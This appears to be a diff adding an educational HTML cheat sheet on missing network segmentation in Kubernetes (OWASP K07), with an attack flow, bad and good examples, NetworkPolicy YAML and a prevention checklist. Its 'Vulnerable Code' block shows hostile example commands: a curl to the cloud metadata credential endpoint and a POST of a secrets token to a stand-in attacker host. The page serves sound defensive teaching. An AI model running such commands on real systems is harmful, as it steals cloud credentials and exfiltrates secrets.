@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>K07: Missing Network Segmentation Controls - Quick Reference</title>
+    <link rel="stylesheet" href="../assets/cheat-sheet-style.css">
+    <style>
+        .back-nav {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 1000;
+        }
+
+        .back-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 20px;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: var(--darker-color);
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: 600;
+            border: 1px solid var(--primary-color);
+            box-shadow: none;
+            transition: all 0.3s;
+        }
+
+        .back-btn:hover {
+            transform: translateX(-5px);
+            box-shadow: none;
+        }
+
+        @media print {
+            .back-nav { display: none; }
+        }
+    </style>
+</head>
+<body>
+    <div class="back-nav">
+        <a href="../index.html" class="back-btn">
+            <i class="fas fa-arrow-left"></i> Back to Cheat Sheets
+        </a>
+    </div>
+
+    <div class="cheat-sheet">
+        <!-- Header -->
+        <div class="header">
+            <h1>🕸️ Missing Network Segmentation Controls</h1>
+            <p class="subtitle">OWASP Kubernetes Top 10 - K07</p>
+            <span class="category">HIGH RISK</span>
+        </div>
+
+        <!-- Main Content -->
+        <div class="content">
+            <!-- Overview Section -->
+            <div class="section full-width">
+                <h2>📋 What Is It?</h2>
+                <p><strong>Missing Network Segmentation</strong> is the failure to restrict which pods, namespaces, and external endpoints can talk to one another. By default a Kubernetes cluster is a <strong>flat, fully-connected network</strong>: every pod can reach every other pod, in every namespace, on every port — plus the internet and the cloud metadata service. Segmentation is <em>opt-in</em>: you must author <code>NetworkPolicy</code> objects (and run a CNI that enforces them), or add a service mesh. This is the control that <strong>contains a breach</strong> — without it, one compromised pod inherits the reachability of the entire cluster.</p>
+
+                <div class="stats-grid">
+                    <div class="stat-box">
+                        <span class="value">K07</span>
+                        <span class="label">OWASP Rank</span>
+                    </div>
+                    <div class="stat-box">
+                        <span class="value">Flat by Default</span>
+                        <span class="label">Root Cause</span>
+                    </div>
+                    <div class="stat-box">
+                        <span class="value">Blast Radius</span>
+                        <span class="label">Impact</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Common Exploit Patterns -->
+            <div class="section">
+                <h2>⚠️ Common Exploits</h2>
+                <ul>
+                    <li><strong>Internal Recon:</strong> cluster DNS + pod CIDR map every reachable service for free</li>
+                    <li><strong>Direct Datastore Access:</strong> DB reachable from any pod, not just its API tier</li>
+                    <li><strong>Cross-Namespace Pivot:</strong> namespaces are not a network boundary</li>
+                    <li><strong>SSRF-to-Metadata:</strong> reach <code>169.254.169.254</code> to steal node cloud credentials</li>
+                    <li><strong>Control-Plane Reach:</strong> pods route to the API server and kubelet (10250)</li>
+                    <li><strong>Open Egress:</strong> unrestricted outbound for C2 and data exfiltration</li>
+                    <li><strong>Impersonation:</strong> no mTLS means network position is treated as trust</li>
+                </ul>
+            </div>
+
+            <!-- Attack Flow -->
+            <div class="section">
+                <h2>🔴 Attack Flow</h2>
+                <div class="attack-flow">
+1. Land — code execution in one pod (app vuln, SSRF, supply chain)<br>
+   <span class="arrow">↓</span><br>
+2. Discover — enumerate reachable pods, services, DNS, ports<br>
+   <span class="arrow">↓</span><br>
+3. Pivot east-west — connect to databases, admin APIs, other namespaces<br>
+   <span class="arrow">↓</span><br>
+4. Escalate — reach API server/kubelet; hit metadata for cloud creds<br>
+   <span class="arrow">↓</span><br>
+5. <strong>IMPACT: Cluster-wide breach, cloud-account theft, exfiltration!</strong>
+                </div>
+            </div>
+
+            <!-- Vulnerable Code Example -->
+            <div class="section full-width">
+                <h2>❌ Vulnerable Code</h2>
+                <div class="code-block vulnerable">
+<span class="comment"># Bad: no NetworkPolicy at all — the cluster is flat (default-allow)</span>
+$ kubectl get networkpolicy -n app-prod
+No resources found in app-prod namespace.
+<span class="comment"># Every pod can reach every pod, every namespace, metadata, the internet.</span>
+
+<span class="comment"># Bad: from a compromised frontend pod — direct datastore access</span>
+psql postgres://app:pw@orders-db.app-prod.svc:5432/prod
+
+<span class="comment"># Bad: namespaces are only a naming boundary, freely cross-reachable</span>
+curl http://orders-api.team-b.svc.cluster.local/internal/dump
+
+<span class="comment"># Bad: unrestricted egress = cloud credential theft + exfiltration</span>
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl -X POST https://attacker.example/c2 -d @/etc/secrets/token
+
+<span class="comment"># Bad: no mTLS — the service trusts anything that can route to it</span>
+curl http://orders.app-prod.svc/internal/refund -H <span class="string">"X-Internal-Caller: billing"</span>
+                </div>
+            </div>
+
+            <!-- Secure Code Example -->
+            <div class="section full-width">
+                <h2>✅ Secure Code</h2>
+                <div class="code-block secure">
+<span class="comment"># Good: default-deny ingress AND egress baseline in EVERY namespace</span>
+<span class="keyword">apiVersion</span>: networking.k8s.io/v1
+<span class="keyword">kind</span>: NetworkPolicy
+<span class="keyword">metadata</span>:
+  <span class="keyword">name</span>: default-deny-all
+  <span class="keyword">namespace</span>: app-prod
+<span class="keyword">spec</span>:
+  <span class="keyword">podSelector</span>: {}          <span class="comment">← selects every pod in the namespace</span>
+  <span class="keyword">policyTypes</span>: [Ingress, Egress]   <span class="comment">← deny egress too, not just ingress</span>
+  <span class="comment"># no rules => nothing allowed; then allow-list each real flow</span>
+
+<span class="comment"># Good: scope the database to ONLY its intended caller and port</span>
+<span class="keyword">spec</span>:
+  <span class="keyword">podSelector</span>:
+    <span class="keyword">matchLabels</span>: { app: orders-db }
+  <span class="keyword">policyTypes</span>: [Ingress]
+  <span class="keyword">ingress</span>:
+    - <span class="keyword">from</span>:
+        - <span class="keyword">podSelector</span>:
+            <span class="keyword">matchLabels</span>: { app: orders-api }   <span class="comment">← only orders-api</span>
+      <span class="keyword">ports</span>:
+        - { protocol: TCP, port: 5432 }
+
+<span class="comment"># Good: allow external egress but EXCLUDE the metadata + internal ranges</span>
+  <span class="keyword">egress</span>:
+    - <span class="keyword">to</span>:
+        - <span class="keyword">ipBlock</span>:
+            <span class="keyword">cidr</span>: 0.0.0.0/0
+            <span class="keyword">except</span>: [169.254.169.254/32, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16]
+
+<span class="comment"># Good: enforce mTLS so identity — not IP — is the trust boundary (Istio)</span>
+<span class="keyword">kind</span>: PeerAuthentication
+<span class="keyword">spec</span>:
+  <span class="keyword">mtls</span>: { mode: STRICT }     <span class="comment">← reject any non-mTLS (unidentified) traffic</span>
+                </div>
+            </div>
+
+            <!-- Prevention Checklist -->
+            <div class="section">
+                <h2>✓ Prevention Checklist</h2>
+                <ul class="checklist">
+                    <li>Run a CNI that actually enforces NetworkPolicy (Calico/Cilium)</li>
+                    <li>Apply a default-deny ingress + egress baseline in every namespace</li>
+                    <li>Allow-list only required flows — including DNS to CoreDNS</li>
+                    <li>Isolate namespaces (same-namespace-only ingress)</li>
+                    <li>Keep dev/staging/prod separated, never allow-listed together</li>
+                    <li>Block egress to <code>169.254.169.254</code> (cloud metadata)</li>
+                    <li>Enforce IMDSv2 and right-size the node IAM role</li>
+                    <li>Deny pod egress to kubelet ports (10250) and node IPs</li>
+                    <li>Add a service mesh for mTLS + identity-based policy</li>
+                    <li>Auto-generate the deny baseline for new namespaces (Kyverno)</li>
+                    <li>Enable CNI flow logs and alert on anomalous flows</li>
+                </ul>
+            </div>
+
+            <!-- Detection & Tools -->
+            <div class="section">
+                <h2>🔍 Detection & Tools</h2>
+                <h3>Kubernetes Tools:</h3>
+                <div class="tools-list">
+                    <span class="tool-tag">Cilium</span>
+                    <span class="tool-tag">Calico</span>
+                    <span class="tool-tag">Hubble</span>
+                    <span class="tool-tag">kubescape</span>
+                    <span class="tool-tag">Falco</span>
+                    <span class="tool-tag">Trivy</span>
+                </div>
+
+                <h3>Policy Enforcement:</h3>
+                <div class="tools-list">
+                    <span class="tool-tag">Kyverno</span>
+                    <span class="tool-tag">OPA/Gatekeeper</span>
+                    <span class="tool-tag">Istio</span>
+                    <span class="tool-tag">Linkerd</span>
+                </div>
+
+                <h3>How to Test:</h3>
+                <ul>
+                    <li><code>kubectl get netpol -A</code> — every namespace should have a deny baseline</li>
+                    <li>Apply a deny-all, then confirm a working connection is now refused (proves CNI enforces)</li>
+                    <li>From a test pod, try <code>curl 169.254.169.254</code> — must be blocked</li>
+                    <li>Sweep pod CIDR for open datastore ports (5432, 6379, 27017)</li>
+                    <li>Run Cilium's connectivity test or scripted probes in CI</li>
+                </ul>
+            </div>
+
+            <!-- Real-World Examples -->
+            <div class="section full-width">
+                <h2>🌍 Real-World</h2>
+                <ul>
+                    <li><strong>Compromised Pod → Cloud Credentials:</strong> unrestricted egress lets in-pod code reach <code>169.254.169.254</code> and pull the node's IAM credentials — the Kubernetes-native version of the classic SSRF-to-metadata cloud breach.</li>
+                    <li><strong>Cryptomining Worm on a Flat Cluster:</strong> publicly analyzed Kubernetes-targeting malware has repeatedly relied on flat-network reachability to scan, find unauthenticated kubelets/datastores, and spread laterally.</li>
+                    <li><strong>Cross-Tenant Reach:</strong> shared clusters separated only by namespace, with no policy between them — one tenant's compromise reaches another's data, because namespaces are not a network boundary.</li>
+                </ul>
+                <p><em>Described as generic, well-documented incident classes — treat any single quoted percentage as illustrative. The durable truth: Kubernetes networking is flat by default.</em></p>
+            </div>
+
+            <!-- Quick Reference -->
+            <div class="section">
+                <h2>📌 Quick Tips</h2>
+                <ul>
+                    <li><span class="badge critical">DO NOT</span> rely on namespaces for network isolation</li>
+                    <li><span class="badge critical">DO NOT</span> leave egress unrestricted (metadata + internet)</li>
+                    <li><span class="badge critical">DO NOT</span> assume policies work without a policy-enforcing CNI</li>
+                    <li><span class="badge high">DO</span> apply default-deny ingress + egress everywhere</li>
+                    <li><span class="badge high">DO</span> allow-list only the flows the app truly needs</li>
+                    <li><span class="badge high">DO</span> block <code>169.254.169.254</code> and add mTLS</li>
+                    <li><span class="badge medium">DO</span> automate the baseline and monitor flow logs</li>
+                </ul>
+            </div>
+
+            <!-- Related Risks -->
+            <div class="section">
+                <h2>📜 Related Risks</h2>
+                <p><strong>Connected OWASP Kubernetes Top 10:</strong></p>
+                <ul>
+                    <li><span class="badge critical">K06</span> Broken Authentication — the kubelet/API doors pods reach</li>
+                    <li><span class="badge high">K01</span> Insecure Workload Config — contains pod escape</li>
+                    <li><span class="badge medium">K03</span> Overly Permissive RBAC — contains API abuse</li>
+                    <li><span class="badge medium">K05</span> Inadequate Logging & Monitoring — flow visibility</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p><strong>OWASP Kubernetes Top 10 — Educational Platform</strong> | <a href="../index.html">All Cheat Sheets</a> | <a href="/">Home</a></p>
+            <p>Full lesson: <a href="/labs/kubernetes/OWASP-Kubernetes/K07-Missing-Network-Segmentation-Controls/overview.html">Read the deep dive →</a></p>
+            <p>📥 To download as PDF: Print this page (Ctrl+P) → Save as PDF</p>
+        </div>
+    </div>
+</body>
+</html>
